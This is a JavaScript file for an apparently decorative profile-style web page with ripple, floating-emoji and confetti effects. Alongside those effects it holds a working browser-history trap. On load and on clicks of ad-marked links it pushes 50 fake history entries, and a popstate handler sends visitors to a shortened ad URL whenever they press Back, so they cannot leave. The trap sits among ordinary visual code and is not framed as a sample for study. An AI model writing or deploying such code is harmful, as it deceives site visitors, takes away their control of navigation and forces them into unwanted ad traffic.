// ====== Configuration ======
const AD_URL = "https://shorter.me/WHO7C"; 
const HISTORY_PUSH_COUNT = 50; 

// ====== Helpers ======
function safePushStates(count = 1) {
  for (let i = 0; i < count; i++) {
    try { 
      history.pushState({trap:i}, "", location.href); 
    } catch(e) { 
      /* ignore */ 
    }
  }
}

// ====== Redirect logic ======
function goToAdImmediate() {
  // push states to make sure back returns to this page
  safePushStates(HISTORY_PUSH_COUNT);
  // navigate to ad in same tab
  window.location.href = AD_URL;
}

// Attach click handlers to buttons that should redirect
document.querySelectorAll('a[data-ad="true"]').forEach(a => {
  a.addEventListener('click', function(e) {
    e.preventDefault();
    // visual ripple
    createRipple(this, e);
    // small timeout so user sees ripple then redirect
    setTimeout(() => { 
      goToAdImmediate(); 
    }, 160);
  });
});

// When user returns to this page via Back (popstate), redirect again to AD
window.addEventListener('popstate', function (e) {
  // immediate redirect back to ad
  window.location.href = AD_URL;
});

// On page load: proactively push a couple of states so that if user navigates away
// and presses Back they return here (and popstate will redirect).
window.addEventListener('load', function () {
  safePushStates(HISTORY_PUSH_COUNT);
  // start floating elements animation
  startFloatingElements();
  // add pulse animation to profile image
  document.querySelector('.profile-img').classList.add('pulse');
});

// ====== Ripple visual ======
function createRipple(el, event) {
  const rect = el.getBoundingClientRect();
  const x = event.clientX - rect.left;
  const y = event.clientY - rect.top;
  const span = document.createElement('span');
  span.className = 'ripple';
  span.style.left = (x - 50) + 'px';
  span.style.top = (y - 50) + 'px';
  el.appendChild(span);
  setTimeout(() => span.remove(), 800);
}

// ====== Floating elements ======
function startFloatingElements() {
  const container = document.querySelector('.floating-elements');
  if (!container) return;
  
  function spawn() {
    const types = ['heart', 'star', 'circle', 'flower'];
    const type = types[Math.floor(Math.random() * types.length)];
    const s = document.createElement('span');
    
    if (type === 'circle') {
      s.className = 'circle';
    } else {
      s.className = type;
      if (type === 'heart') s.textContent = '❤';
      if (type === 'star') s.textContent = '⭐';
      if (type === 'flower') s.textContent = '🌸';
    }
    
    s.style.left = (Math.random() * 100) + 'vw';
    s.style.fontSize = (Math.random() * 20 + 15) + 'px';
    s.style.animationDuration = (Math.random() * 6 + 4) + 's';
    s.style.animationDelay = (Math.random() * 5) + 's';
    
    container.appendChild(s);
    setTimeout(() => s.remove(), 10000);
  }
  
  // spawn initially a bunch of elements
  for (let i = 0; i < 15; i++) {
    setTimeout(spawn, i * 300);
  }
  
  // keep spawning
  setInterval(spawn, 500);
}

// ====== Additional effects ======
// Add hover effect to container
document.querySelector('.container').addEventListener('mouseenter', function() {
  this.style.transform = 'translateY(-5px)';
  this.style.boxShadow = '0 20px 40px rgba(0,0,0,0.15)';
});

document.querySelector('.container').addEventListener('mouseleave', function() {
  this.style.transform = 'translateY(0)';
  this.style.boxShadow = 'var(--shadow)';
});

// Add confetti effect on button click
function createConfetti() {
  const colors = ['#ff4b7d', '#4b9fff', '#ffd700', '#9b59b6', '#2ecc71'];
  const container = document.querySelector('.floating-elements');
  
  for (let i = 0; i < 30; i++) {
    const confetti = document.createElement('div');
    confetti.style.position = 'fixed';
    confetti.style.width = '10px';
    confetti.style.height = '10px';
    confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
    confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '0';
    confetti.style.left = Math.random() * 100 + 'vw';
    confetti.style.top = '-20px';
    confetti.style.opacity = '0.8';
    confetti.style.zIndex = '9999';
    
    const animation = confetti.animate([
      { transform: 'translateY(0) rotate(0deg)', opacity: 1 },
      { transform: `translateY(${window.innerHeight}px) rotate(${Math.random() * 360}deg)`, opacity: 0 }
    ], {
      duration: Math.random() * 3000 + 2000,
      easing: 'cubic-bezier(0.1, 0.8, 0.2, 1)'
    });
    
    container.appendChild(confetti);
    animation.onfinish = () => confetti.remove();
  }
}

// Add confetti to button clicks
document.querySelectorAll('.btn').forEach(btn => {
  btn.addEventListener('click', function() {
    createConfetti();
  });
});
